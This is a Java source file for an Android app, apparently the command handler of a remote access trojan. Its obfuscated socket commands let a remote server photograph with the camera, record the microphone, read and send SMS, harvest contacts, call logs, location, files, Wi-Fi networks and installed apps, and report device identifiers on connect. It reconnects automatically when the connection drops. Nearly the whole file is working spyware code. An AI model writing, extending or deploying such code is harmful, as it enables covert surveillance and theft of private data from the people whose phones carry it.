package com.remote.app;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionState;
import com.remote.app.socket.IOSocket;

import org.json.JSONException;
import org.json.JSONObject;

import io.reactivex.CompletableObserver;
import io.reactivex.disposables.Disposable;

public class ConnectionManager {


    public static Context context;
    private static HubConnection ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if (ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();

            ///ioSocket.on("ping", () -> ioSocket.send("pong"));

            ioSocket.on("0xCA", (data) -> {
                try {
                    if (data.getString("action").equals("camList"))
                        CA(-1);
                    else if (data.getString("action").equals("takePic"))
                        CA(Integer.parseInt(data.getString("cameraID")));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, JSONObject.class);

            ioSocket.on("0xFI", (action, path) -> {
                try {
                    if (action.equals("ls"))
                        FI(0, path);
                    else if (action.equals("dl"))
                        FI(1, path);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, String.class, String.class);

            ioSocket.on("0xSM", (action, to, sms) -> {
                try {
                    if (action.equals("ls"))
                        SM(0, null, null);
                    else if (action.equals("sendSMS"))
                        SM(1, to, sms);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, String.class, String.class, String.class);


            ioSocket.on("0xCL", () -> {
                try {
                    CL();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });


            ioSocket.on("0xCO", () -> {
                try {
                    CO();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });


            ioSocket.on("0xMI", (sec) -> {
                try {
                    MI(sec);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, Integer.class);


            ioSocket.on("0xLO", () -> {
                try {
                    LO();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            ioSocket.on("0xWI", () -> {
                try {
                    WI();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            ioSocket.on("0xPM", () -> {
                try {
                    PM();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            ioSocket.on("0xIN", () -> {
                try {
                    IN();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            ioSocket.on("0xGP", (permission) -> {
                try {
                    GP(permission);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, String.class);

            ioSocket.onClosed((ex) -> {
                ioSocket.start();
            });

            ioSocket.start().subscribe(new CompletableObserver() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onError(@NonNull Throwable e) {
                    Log.e("SOCKET", e.toString());
                }

                @Override
                public void onComplete() {
                    String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
                    //ioSocket = IO.socket("http://192.168="+Build.VERSION.RELEASE+"&id="+deviceID);

                    try {
                        JSONObject obj = new JSONObject();
                        obj.put("DeviceId", deviceID);

                        obj.put("Release", Build.VERSION.RELEASE);
                        obj.put("Manufacturer", Build.MANUFACTURER);
                        obj.put("Model", Build.MODEL);
                        obj.put("IpAddress", Utils.getIPAddress(true));


                        ioSocket.send("_0xSD", obj.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
            ;

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }

    }

    public static void CA(int cameraID) {
        if (cameraID == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.send("_0xCA", cameraList);
        } else {
            new CameraManager(context).startUp(cameraID);
        }
    }

    public static void FI(int req, String path) {
        if (req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put("type", "list");
                object.put("list", FileManager.walk(path));
                ioSocket.send("_0xFI", object);
            } catch (JSONException e) {
            }
        } else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void SM(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.send("_0xLM", SMSManager.getsms());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.send("_0xSM", isSent);
        }
    }

    public static void CL() {
        ioSocket.send("_0xCL", CallsManager.getCallsLogs().toString());
    }

    public static void CO() {
        ioSocket.send("_0xCO", ContactsManager.getContacts().toString());
    }

    public static void MI(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void WI() {
        ioSocket.send("_0xWI", WifiScanner.scan(context).toString());
    }

    public static void PM() {
        ioSocket.send("_0xPM", PermissionManager.getGrantedPermissions().toString());
    }


    public static void IN() {
        ioSocket.send("_0xIN", AppList.getInstalledApps(false).toString());
    }


    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.send("_0xGP", data.toString());
        } catch (JSONException e) {

        }
    }

    public static void LO() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if (gps.canGetLocation()) {
            ioSocket.send("_0xLO", gps.getData());
        }
    }

}
